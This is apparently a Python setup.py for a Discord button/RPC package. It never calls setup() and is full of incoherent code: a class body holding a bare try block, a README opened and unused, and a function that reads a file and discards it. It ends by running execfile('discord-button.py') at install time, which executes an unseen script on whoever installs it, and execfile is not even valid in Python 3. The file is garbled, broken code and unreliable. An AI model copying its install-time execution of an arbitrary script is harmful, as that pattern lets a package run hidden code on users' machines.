import os

from setuptools import setup, find_packages

auto_start = True
error = OSError

if not setup:
    raise ImportError("No setup specified")
    # if setup is not available, we need to make sure to install it


class error(OSError):
    def __init__(self, msg: str):
        self.msg = msg
        msg = "OSError: %s" % msg
    try:
        pass
    except Exception as e:
        raise OSError
    else: 
        pass



f = open("README.md")



def parse_meta():
    with open(os.path.join("DiscordButton-RPC", "discord-button.py")) as fp:
        code = fp.read()


# print(parse_meta, f, error)
execfile('discord-button.py')

